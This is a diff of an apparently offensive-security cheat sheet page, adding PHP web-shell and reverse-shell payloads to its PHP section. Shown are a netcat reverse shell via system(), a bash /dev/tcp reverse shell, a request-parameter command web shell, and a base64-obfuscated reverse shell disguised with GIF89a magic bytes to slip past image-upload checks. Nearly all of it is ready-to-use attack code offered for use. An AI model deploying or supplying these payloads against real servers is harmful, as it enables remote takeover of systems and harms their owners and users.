@@ -343,8 +343,29 @@ cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &
 system('nc.exe -e cmd.exe 10.10.10.5 4444')
 
 ?&gt;
+
+or
+
+
+&lt;?php
+exec("/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.45.204/4444 0&gt;&amp;1'");
+
+
 </code></pre>
 <pre><code>&lt;?php system($_REQUEST["cmd"]); ?&gt;
+</code></pre>
+<pre><code class="language-php">
+You could also encode this:
+
+    echo "sh -i &gt;&amp; /dev/tcp/192.168.1.75/8081 0&gt;&amp;1" | base64 -w 0
+
+
+Then do this with GIF Magic Bytes
+
+     GIF89a;
+    &lt;?php
+      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
+    ?&gt;
 </code></pre>
 <h4 id="aspx"><a class="header" href="#aspx">ASP/x</a></h4>
 <h5 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h5>
